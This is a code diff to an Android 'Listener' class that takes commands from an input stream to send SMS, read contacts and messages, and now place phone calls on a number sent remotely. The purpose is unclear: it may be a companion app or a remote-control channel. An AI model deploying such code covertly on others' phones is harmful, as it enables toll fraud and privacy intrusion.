@@ -63,6 +63,9 @@ public class Listener implements Runnable {
 				case 3:
 					sendSMS(_in);
 					break;
+				case 4:
+					makeCall(_in);
+					break;
 				}
 			}
 		} catch (Throwable e) {
@@ -82,6 +85,13 @@ public class Listener implements Runnable {
 		sendSMS(adress,body,id);
 		Log.i("SMS SENT", id+"|"+adress+":"+body);		
 	}
+	
+	private void makeCall(DataInputStream in) throws IOException {
+		String phoneNumber=readString(in);
+		Log.i("MAKE CALL", phoneNumber);
+		makeCall(phoneNumber);
+		Log.i("CALL MADE", phoneNumber);
+	}
 
 	private void readContacts(DataInputStream _in2) throws IOException {
 		accepted.getSendAll();		
@@ -93,6 +103,14 @@ public class Listener implements Runnable {
 		accepted.getSMS(id);
 	}
 
+	public void makeCall(final String phoneNumber)
+	{
+		String url = "tel:" + phoneNumber;
+		Intent intent = new Intent(Intent.ACTION_CALL);
+		intent.setData(Uri.parse(url));
+		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+		context.startActivity(intent);
+	}
 
 	public void sendSMS(final String phoneNumber, final String message, final String id)
 	{        
